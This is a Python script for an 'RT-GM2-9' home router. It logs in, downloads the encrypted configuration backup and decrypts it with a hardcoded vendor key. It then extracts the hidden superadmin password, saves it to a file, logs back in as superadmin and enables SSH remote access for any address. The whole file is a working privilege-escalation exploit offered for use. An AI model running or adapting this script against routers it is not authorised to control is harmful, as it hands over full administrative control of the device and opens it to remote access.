from requests import get, post, Session
from Crypto.Cipher import AES
from sys import argv, exit
from Crypto import Random
from random import random
from hashlib import md5
from os import remove
import argparse
import socket
import gzip

parser = argparse.ArgumentParser(description="RT-GM2-9/1.6.1379 enable SSH")
	
parser.add_argument("-L", "--login", type=str, required=True, help="login")
parser.add_argument("-P", "--password", type=str, required=True, help="password")
	
args = parser.parse_args()

login, password = args.login, args.password
host, port = "192.168.0.1", 80

print("[+] Host:%s\n[+] Port:%i\n[+] Login:%s\n[+] Password:%s" % (host, port, login, password))

pass_hash = md5(password.encode()).hexdigest()

sesh = Session()

print("[+] Getting old config...")

req = sesh.post("http://%s:%i/login.htm" % (host, port), data={"f_password":pass_hash, "f_currURL":"http://%s:%i/old_login.htm" % (host, port), "f_username":login, "pwd":""})
session_key = sesh.get("http://%s:%i/advanced/conSession.htm" % (host, port), params={"id":str(random())}).text
req = get("http://%s:%i/config_old_tl.xgi" % (host, port), params = {"sessionKey":session_key})

file = open("config.bin", "wb")
file.write(req.content)
file.close()

print("[+] decryption...")
#DECRIPTION

enc_file = open("config.bin", "rb")
out_file = open("config.gz", "wb")

enc_file.read(16)

bs = AES.block_size
salt = enc_file.read(bs)[len("Salted__"):]
d = d_i = b""
password = b"RT-GM2-9"

key_length = 32
iv_length = bs

while len(d) < key_length + iv_length:

	d_i = md5(d_i + password + salt).digest()
	d += d_i

key = d[:key_length] 
iv = d[key_length:key_length+iv_length]
cipher = AES.new(key, AES.MODE_CBC, iv)
next_chunk = b""
finished = False

while not finished:

	chunk, next_chunk = next_chunk, cipher.decrypt(enc_file.read(1024 * bs))

	if len(next_chunk) == 0:

		padding_length = chunk[-1]
		chunk = chunk[:-padding_length]
		finished = True

	out_file.write(chunk)

enc_file.close()
out_file.close()

#SUPERADMIN PASS

config_gz = gzip.open("config.gz", "rb")

while 1:

	line = config_gz.readline()
	if b"superadmin" in line:
		pass_line = config_gz.readline()
		config_gz.close()
		break

remove("config.bin")
remove("config.gz")

login = "superadmin"
password = pass_line.decode().strip().strip("<password>").strip("</")
pass_hash = md5(password.encode()).hexdigest()

open("superadmin.txt", "w").write("superadmin:" + password)

print("[+] superadmin pass: %s" % (password))

#LOGOUT

session_key = sesh.get("http://%s:%i/advanced/conSession.htm" % (host, port), params={"id":str(random())}).text
req = sesh.get("http://%s:%i/maintenance/logout.xgi" % (host, port), params = {"sessionKey":session_key})
req = sesh.get("http://%s:%i/login.htm" % (host, port), params = {"logtmr":0})

#ENABLE SSH

sesh = Session()

req = sesh.post("http://%s:%i/login.htm" % (host, port), data={"f_password":pass_hash, "f_currURL":"http://%s:%i/old_login.htm" % (host, port), "f_username":login, "pwd":""})
session_key = sesh.get("http://%s:%i/advanced/conSession.htm" % (host, port), params={"id":str(random())}).text

data = {
	"sessionKey":session_key,
	"setPath":"/InternetGatewayDevice/UserInterface/RemoteAccess:6/",
	"IP": "0.0.0.0",
	"Mask": "0.0.0.0",
	"Protocol": "SSH",
	"Enable": 1,
	"Port": 22,
	"Interface":"InternetGatewayDevice.LANDevice.1.LANHostConfigManagement.IPInterface.1.",
	"endSetPath": 1,
	"CMT": 0,
	"APPLY": 1
		}

req = sesh.get("http://%s:%i/maintenance/mt_acremote_tl.xgi" % (host, port), params = data)

sock = socket.socket()
sock.settimeout(10)
try:
	sock.connect((host, 22))
	print("[+] %s:%i --> %s" % (host, 22, sock.recv(1024).decode()))
except Exception as error:
	print(error)